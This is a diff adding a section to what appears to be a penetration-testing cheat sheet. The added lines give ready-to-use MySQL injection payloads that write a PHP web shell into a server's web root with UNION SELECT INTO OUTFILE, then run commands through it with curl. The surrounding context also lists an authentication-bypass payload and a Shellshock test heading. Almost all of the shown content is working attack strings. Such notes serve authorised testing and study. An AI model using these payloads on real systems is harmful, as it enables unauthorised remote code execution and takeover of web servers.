@@ -159,6 +159,16 @@ SQL Injection
 * If authentication page is present, ALWAYS try **auth bypass payload** e.g. `' or '1'='1`
 * If time-based SQLi, you could also find a script to brute-force password one-char at-a-time.
 
+MySQL Injection -> PHP Code Execution
+```sql
+/* STEP 1: find the web root - C:\xampp\htdocs or /var/www/html etc. */
+/* STEP 2: write PHP code into web root */
+'UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "C:\\xampp\\htdocs\\shell.php"'
+'UNION SELECT '<?php system($_GET['cmd']); ?>' INTO OUTFILE 'C:\\xampp\\htdocs\\shell.php'-- -'
+/* STEP 3: code exec */
+$ curl -v http://[target]/shell.php?cmd=whoami
+```
+
 Apache Shellchock (/cgi-bin/*.cgi])
 ```bash
 # Test if vulnerable
